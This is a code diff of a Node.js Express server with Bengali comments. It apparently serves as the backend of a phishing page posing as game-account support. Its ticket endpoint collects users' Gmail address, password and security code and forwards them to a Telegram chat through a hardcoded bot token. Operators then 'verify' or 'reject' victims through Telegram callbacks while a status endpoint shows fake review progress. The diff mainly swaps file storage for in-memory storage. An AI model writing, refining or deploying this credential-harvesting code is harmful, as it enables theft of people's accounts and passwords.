@@ -1,16 +1,19 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
-const fs = require('fs');
-const path = require('path');
 
 const app = express();
 
-// CORS সম্পূর্ণ ওপেন করা
-app.use(cors({ origin: '*' }));
+// CORS সম্পূর্ণভাবে উন্মুক্ত করা হলো
+app.use(cors({
+    origin: '*',
+    methods: ['GET', 'POST'],
+    allowedHeaders: ['Content-Type']
+}));
+
 app.use(express.json());
 
-// ক্যাশিং বন্ধ করার হেডার
+// ক্যাশিং রোধ করার হেডার
 app.use((req, res, next) => {
     res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
     res.setHeader('Pragma', 'no-cache');
@@ -20,40 +23,23 @@ app.use((req, res, next) => {
 
 const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10";
 const TELEGRAM_CHAT_ID = "-1004444318249";
-const DB_FILE = path.join(__dirname, 'database.json');
 
-// ডাটাবেজ ফাইল রিড করা
-function readDB() {
-    if (!fs.existsSync(DB_FILE)) {
-        fs.writeFileSync(DB_FILE, JSON.stringify({}));
-    }
-    try {
-        const data = fs.readFileSync(DB_FILE, 'utf8');
-        return JSON.parse(data);
-    } catch (e) {
-        return {};
-    }
-}
+// স্ট্যাটাস মেমোরিতে ধরে রাখার অবজেক্ট
+global.userStore = global.userStore || {};
 
-// ডাটাবেজ ফাইলে সেভ করা
-function writeDB(data) {
-    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
-}
+app.get('/', (req, res) => res.send("Backend Server Active"));
 
-app.get('/', (req, res) => res.send("Backend Running Cleanly!"));
-
-// ১. ফর্ম সাবমিট API
+// ১. টিকিট সাবমিট
 app.post('/api/submit-ticket', async (req, res) => {
     const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
     
-    let db = readDB();
-    db[uid] = {
+    // ইনিশিয়াল ডাটা সেভ
+    global.userStore[uid] = {
         status: "Pending",
         name: "Checking Status...",
         level: "Under Review",
         reason: ""
     };
-    writeDB(db);
 
     const telegramMessage = `
 📩 *New Support Ticket Submitted!*
@@ -93,9 +79,10 @@ app.post('/api/submit-ticket', async (req, res) => {
     }
 });
 
-// ২. টেলিগ্রাম ওয়েবহুক API
+// ২. টেলিগ্রাম ওয়েবহুক
 app.post('/api/telegram-webhook', async (req, res) => {
-    res.sendStatus(200); // টেলিগ্রামকে আগে OK রেসপন্স দেওয়া
+    // টেলিগ্রামকে তাত্ক্ষণিক রেসপন্স দেওয়া
+    res.sendStatus(200);
 
     try {
         const update = req.body;
@@ -111,16 +98,13 @@ app.post('/api/telegram-webhook', async (req, res) => {
             const uid = parts[1];
             const reason = parts[2] || "Information Mismatch";
 
-            let db = readDB();
-
             if (action === 'verify') {
-                db[uid] = {
+                global.userStore[uid] = {
                     status: "Verified",
                     name: "Verified Player",
                     level: "Active Account",
                     reason: ""
                 };
-                writeDB(db);
 
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                     chat_id: chatId,
@@ -136,13 +120,12 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 });
 
             } else if (action === 'reject') {
-                db[uid] = {
+                global.userStore[uid] = {
                     status: "Rejected",
                     name: "Verification Failed",
                     level: "N/A",
                     reason: reason
                 };
-                writeDB(db);
 
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                     chat_id: chatId,
@@ -160,19 +143,18 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
             await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                 callback_query_id: callbackQuery.id,
-                text: `UID ${uid} Updated!`
+                text: `UID ${uid} Updated Successfully!`
             });
         }
     } catch (err) {
-        console.error("Error processing callback:", err);
+        console.error("Webhook Execution Error:", err);
     }
 });
 
-// ৩. লাইভ স্ট্যাটাস চেক API
+// ৩. লাইভ স্ট্যাটাস নেওয়ার API
 app.get('/api/check-status/:uid', (req, res) => {
     const uid = req.params.uid;
-    const db = readDB();
-    const userData = db[uid] || {
+    const userData = global.userStore[uid] || {
         status: "Pending",
         name: "Checking Status...",
         level: "Under Review",
@@ -182,4 +164,4 @@ app.get('/api/check-status/:uid', (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+app.listen(PORT, () => console.log(`Server listening on port ${PORT}`));
